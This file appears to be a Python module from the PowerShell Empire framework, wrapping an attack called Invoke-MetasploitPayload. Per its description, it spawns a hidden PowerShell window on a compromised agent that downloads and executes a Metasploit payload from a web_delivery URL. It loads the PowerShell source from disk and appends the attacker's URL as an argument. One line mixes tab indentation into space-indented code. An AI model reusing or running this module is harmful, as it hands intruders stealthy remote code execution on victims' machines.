from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-MetasploitPayload',
            'Author': ['@jaredhaight'],
            'Description': ('Spawns a new, hidden PowerShell window that downloads'
                            'and executes a Metasploit payload. This relies on the' 
                            'exploit/multi/scripts/web_delivery metasploit module.'),
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/jaredhaight/Invoke-MetasploitPayload/'
            ]
        }

        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run Metasploit payload on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'URL' : {
                'Description'   :   'URL from the Metasploit web_delivery module',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):
        
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-MetasploitPayload.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
	script += "\nInvoke-MetasploitPayload"

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script
